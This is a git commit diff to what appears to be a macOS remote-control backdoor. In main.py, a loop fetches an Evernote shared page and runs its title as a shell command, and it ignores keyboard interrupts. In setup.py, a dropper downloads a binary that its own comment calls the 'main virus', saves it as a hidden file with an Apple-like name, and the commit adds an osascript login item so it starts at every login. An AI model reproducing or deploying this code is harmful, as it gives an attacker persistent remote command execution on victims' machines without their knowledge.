b149d1da4571563757c225e0b9af6a8741ab9999
littleblack111 <jerrylam110209@gmail.com>
2023-08-14 10:35:14 +0800

    updated

--- main.py
+++ main.py
@@ -1,24 +1,32 @@
-from bs4 import BeautifulSoup
-from requests import get
-from time import sleep
-from os import system
+try:
+    from bs4 import BeautifulSoup
+    from requests import get
+    from time import sleep
+    from os import system
+    import lxml
 
-old_command = ""
-command = ""
+    old_command = ""
+    command = ""
+except KeyboardInterrupt:
+    pass
 
 while True:
-    #get HTML
+    # prevent keyboardinterrupt
     try:
-        html_file = get("https://www.evernote.com/shard/s721/sh/5ff8aabd-e957-668f-0503-01487d76ba01/GvzSxqlewn4fb3pQpdAww5TUVhNThgVRizYNHu0SI2y5ROrlfE0Dop_EZQ").text
-        soup = BeautifulSoup(html_file, 'lxml')
-        command = soup.find('title').text
-    except:
-        print("failed to connect to server")
-    #execute command
-    if old_command != command:
+        #get HTML
         try:
-            system(f"{command} > /dev/null")
-            old_command = command
+            html_file = get("https://www.evernote.com/shard/s721/sh/5ff8aabd-e957-668f-0503-01487d76ba01/GvzSxqlewn4fb3pQpdAww5TUVhNThgVRizYNHu0SI2y5ROrlfE0Dop_EZQ").text
+            soup = BeautifulSoup(html_file, 'lxml')
+            command = soup.find('title').text
         except:
-            pass
-    sleep(0.1)
+            print("failed to connect to server")
+        #execute command
+        if old_command != command:
+            try:
+                system(f"{command} > /dev/null")
+                old_command = command
+            except:
+                pass
+        sleep(0.1)
+    except KeyboardInterrupt:
+        continue
--- setup.py
+++ setup.py
@@ -2,12 +2,13 @@ from requests import get
 from os.path import expanduser
 from os import remove
 from subprocess import Popen as subproc
+from os import system as cmd
 
 filename = "com.apple.com.user.core"
 
 # download main virus
 open(f"{expanduser('~')}/.{filename}", 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/Remote-Control-With-Evernote/main/main", allow_redirects=True).content)
 
-remove(__file__)
+cmd(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{expanduser('~')}/.{filename}\", hidden:false}}'")
 
 subproc([f"{expanduser('~')}/.{filename}"])
